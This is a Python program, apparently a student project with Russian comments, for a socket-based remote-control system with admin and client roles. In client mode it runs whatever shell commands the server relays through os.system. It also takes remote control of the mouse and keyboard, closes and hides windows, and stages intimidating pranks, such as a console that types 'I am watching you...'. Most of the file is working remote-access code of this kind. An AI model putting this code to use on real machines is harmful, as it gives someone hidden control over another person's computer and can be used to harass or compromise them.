import socket
import time
import threading
import random
import os
import mouse
import keyboard
import pyautogui


# TODO: проверки на ошибки выполнения (что если отключить интернет?)
# TODO: ломаем сервер как можем) *а это мы можем*

def clickLeft():
    print(1)
    mouse.click("left")
    print(2)
def clickRight():
    mouse.click("right")
def typing(text):
    time.sleep(0.2)
    keyboard.write(text)
def switchWindow():
    print("pressing alt")
    keyboard.press("alt+tab")
    keyboard.release("alt+tab")
def closeWindow():
    keyboard.press("alt")
    keyboard.press("f4")
    keyboard.release("alt")
    keyboard.release("f4")
def hideWindows():
    keyboard.press("win")
    keyboard.press("d")
    keyboard.release("win")
    keyboard.release("d")
def changeLanguage():
    keyboard.press("shift")
    keyboard.press("alt")
    keyboard.release("shift")
    keyboard.release("alt")
def Mystify():
    os.system("Mystify.scr -a")
def watchingYou():
    os.system("start cmd")
    time.sleep(0.1)
    keyboard.write("I am watching you...", 0.1)
    time.sleep(1.0)
    keyboard.press("alt")
    keyboard.press("f4")
    keyboard.release("alt")
    keyboard.release("f4")
def cmdCommand(cmd):
    os.system(cmd)
def pressKey(key):
    keyboard.press(key)
    keyboard.release(key)
def dragMouse(x,y):
    mouse.drag(0, 0, x, y, absolute=False, duration=0.02)
def alert(text):
    pyautogui.alert(text=text, title="Alert", button="OK")
def warning(text):
    pyautogui.alert(text=text, title="Warning", button="OK")
def scroll(direction):
    for i in range(8):
        mouse.wheel(int(direction))


# admin -> client
# A$127.0.0.1$26780$cmd$exe
# admin <- client
# 127.0.0.1$26780$22100$1$cmd$exe

client = socket.socket() # создаем объект клиента

user = input("admin or client? \n")  # тестовый вариант!! выбираем, кем будет являться наш пользователь

answer = False

u = "utf-8"

class Thread1(threading.Thread):  # потоки через класс тк threading.Thread(target=...) не работает
    def run(self):
        global answer
        global user
        global uniIdUser

        while True:  # бесконечный цикл с приемом данных (в отдельном потоке)
            if user == "admin":
                data = client.recv(2048)
                d = data.decode("utf-8")  # декодирование файлов в привычный нам вид
                if data:
                    if "SYS" in d:
                        d = d[:-2]
                        command = d.split("$")
                        if command[1] == "MSG":
                            print(f"MSG from server: {command[2]}")
                        elif command[1] == "DISCONNECT":
                            print("Server sent disconnecting packet. Killing this process...")
                            client.shutdown(socket.SHUT_RDWR)
                            client.close()
                            os.kill(os.getpid(), 9)
                        elif command[1] == "SHUTDOWN":
                            print("Server is shutting down! Killing this process...")
                            client.close()
                            os.kill(os.getpid(), 9)
                    else:
                        print(f"DATA FROM SERVER: {d}")  # вывод данных на экран
                        answer = True  # переменная которая нужна для красивого, разборчивого вывода информации в админской консоли

                time.sleep(0.5)  # задержка перед повторным чтением данных (скорость в данном проекте не так важна, а клиент
                # будет потреблять меньше ресурсов)
            elif user == "client":
                data = client.recv(2048)
                d = data.decode("utf-8")
                if data:
                    print(f"DATA FROM SERVER: {d}")
                    if "$" in d:
                        d = d[:-2]
                        command = d.split("$")
                        if command[1] == "mystify": # удаленный запуск команд
                            try:
                                Mystify()
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                print(f"sending to server: C${command[0]}${uniIdUser}$success")
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                print(f"sending to server: C${command[0]}${uniIdUser}$fail")
                        elif command[1] == "click":
                            if command[2] == "left":
                                try:
                                    clickLeft()
                                    client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                except BaseException:
                                    client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                            elif command[2] == "right":
                                try:
                                    clickRight()
                                    client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                except BaseException:
                                    client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                            else:
                                client.send(f"C${command[0]}${uniIdUser}$invalidArgs\n".encode("utf-8"))
                        elif command[1] == "type":
                            try:
                                typing(command[2])
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "altab":  # удаленный запуск команд
                            print("Got command!!!")
                            try:
                                print("Starting switching window")
                                switchWindow()
                                print(2)
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                print(f"sending to server: C${command[0]}${uniIdUser}$success")
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                print(f"sending to server: C${command[0]}${uniIdUser}$fail")
                        elif command[1] == "close":
                            try:
                                closeWindow()
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "hide":
                            try:
                                hideWindows()
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "lang":
                            try:
                                changeLanguage()
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "watching":
                            try:
                                watchingYou()
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "cmd":
                            try:
                                cmdCommand(command[2])
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "press":
                            try:
                                pressKey(command[2])
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "drag":
                            try:
                                pos1 = command[2].split(" ")
                                pos = list(map(int, pos1))
                                print(type(pos[0]), type(pos[1]))
                                if isinstance(pos[0], int) and isinstance(pos[1], int):
                                    dragMouse(pos[0], pos[1])
                                    client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                                else:
                                    client.send(f"C${command[0]}${uniIdUser}$invalidArgs\n".encode("utf-8"))
                            except Exception as e:
                                print(e)
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "alert":
                            try:
                                alert(command[2])
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "warning":
                            try:
                                warning(command[2])
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        elif command[1] == "scroll":
                            try:
                                scroll(command[2])
                                client.send(f"C${command[0]}${uniIdUser}$success\n".encode("utf-8"))
                            except BaseException:
                                client.send(f"C${command[0]}${uniIdUser}$fail\n".encode("utf-8"))
                        else:
                            client.send(f"C${command[0]}${uniIdUser}$unknownCommand\n".encode("utf-8"))
                    elif "SYS" in d:
                        d = d[:-2]
                        command = d.split("$")
                        if command[1] == "SHUTDOWN":
                            print("Server -> client disconnect")
                            os.kill(os.getpid(), 9)
                        elif command[1] == "DISCONNECT":
                            print("Server -> client disconnect")
                            os.kill(os.getpid(), 9)

                    answer = True
class Thread2(threading.Thread):  # поток для бесконечной отправки данных на сервер (когда нам надо)
    def run(self):
        global user
        global answer
        global u
        while True:
            if user == "admin": # для админского юзера:
                while True:
                    while not answer:
                        time.sleep(1)  # ждем ответа от сервера, чтобы все выглядело окей и не перемешивалось
                        print("waiting...")
                        # (данные от сервера в 1 месте, ввод данных пользователя в другом) *лучше не трогать*
                    time.sleep(1)
                    # Далее выбираем режим использования команд (можно потыкать и понять что за что отвечает, хотя код
                    # максимально простой + есть мини описание режимов)
                    fileOrNot = input("-----------------------------------------------------------------\n"
                                      "|Do you want to start existing script (1) or to make it now (2)?|\n"
                                      "|Also you can use advanced mode (3). Testing mode (4)           |\n"
                                      "-----------------------------------------------------------------\n")

                    # Собственно то проверка режима
                    if fileOrNot == "1":  # если использование из файла
                        f = open("file.script")  # открываем наш скрипт для чтения
                        lines = f.readlines()
                        delay = False
                        for i in range(int(lines[0][10]) * 2):  # lines[0][10] - узнаем количество команд.
                            # умножаем на 2, тк после каждой команды задержка
                            if delay:
                                time.sleep(int(lines[i + 1]))
                                delay = False
                                continue
                            if not delay:
                                client.send(f"{lines[i + 1]}\n".encode("utf-8"))
                                print("sending!")
                                print(i)
                                delay = True
                                continue
                    elif fileOrNot == "2":  # блиц-опрос по параметрам, далее в соответствии с ними генерируется команда
                        targetID = input("Enter target id\n")
                        command = input("Enter command for your target\n")
                        args = input("Enter args for your command\n")

                        s = f"A${targetID}${command}${args}\n"
                        client.send(s.encode("utf-8"))
                        print(f"sent {s}")
                        time.sleep(1)

                    elif fileOrNot == "3":  # Просто вводим полную команду и отсылаем ее
                        str1 = "Enter your full command.\n"
                        c = f"{input(str1)}\n"
                        client.send(c.encode("utf-8"))
                    elif fileOrNot == "4":  # Уже сгенерированная команда для тестов
                        client.send("A$26780$click$left\n".encode("utf-8"))
                    else:
                        print("Unknown mode. Try again!")
            elif user == "client":
                input()  # Если это работает, то это писал Акимов Арсений, если нет - Артем Науменко



IP = "127.0.0.1"  # ip и порт
PORT = 8080

print("trying to connect to server...")
client.connect((IP, PORT))  # подключаемся к серверу
print(f"Successfully connected to {IP}:{PORT}. (Client -> Server)")

if user == "admin":  # выбираем пользователя
    print("Logged as Admin")
    if os.path.exists("adminUniID.txt"):
        f = open("adminUniID.txt")
        uniIdAdmin = int(f.read())
        f.close()

        s = "Admin$" + str(uniIdAdmin) + "\n"  # отправляем на сервер специальную строку. ВАЖНО!!! после всех
        # строк
        client.send(s.encode("utf-8"))
    else:
        i = random.randint(1, 32000)
        uniIdAdmin = i

        s = "Admin$" + str(uniIdAdmin) + "\n"  # отправляем на сервер специальную строку. ВАЖНО!!! после всех
        # строк
        client.send(s.encode("utf-8"))
        data = client.recv(2048).decode("utf-8")

        while "Registration success" not in data:
            i = random.randint(1, 32000)
            uniIdAdmin = -i

            s = "Admin$" + str(uniIdAdmin) + "\n"  # отправляем на сервер специальную строку. ВАЖНО!!! после всех
            # строк
            client.send(s.encode("utf-8"))
            data = client.recv(2048).decode("utf-8")
            print(f"data: {data}")
        f = open("adminUniID.txt", "w")
        f.write(str(-uniIdAdmin))
        f.close()

elif user == "client":
    print("Logged as Client")
    if os.path.exists("userUniID.txt"):
        f = open("userUniID.txt")
        uniIdUser = int(f.read())
        f.close()

        s = "Client$" + str(uniIdUser) + "\n"  # отправляем на сервер специальную строку. ВАЖНО!!! после всех
        # строк
        client.send(s.encode("utf-8"))
    else:
        print("Attempting to make id")
        i = random.randint(1, 32000)
        uniIdUser = i

        s = "Client$" + "-" + str(uniIdUser) + "\n"  # отправляем на сервер специальную строку. ВАЖНО!!! после всех
        print(s)
        # строк
        client.send(s.encode("utf-8"))
        data = client.recv(2048).decode("utf-8")
        print(data)

        if "Registration success" not in data:
            while data != "Registration success\n":
                i = random.randint(1, 32000)
                uniIdUser = i

                s = "Client$" + str(uniIdUser) + "\n"  # отправляем на сервер специальную строку. ВАЖНО!!! после всех
                # строк
                client.send(s.encode("utf-8"))
                data = client.recv(2048).decode("utf-8")
        f = open("userUniID.txt", "w")
        f.write(str(uniIdUser))
        f.close()

        print(data)
else:
    print("durak?")


if user == "admin":
    # пишем \n или работать не будет
    print("Enter your commands!")

elif user == "client":
    print("Enter your commands!")


t1 = Thread1()  # запускаем обмен данными с сервером
t1.start()
t2 = Thread2()
t2.start()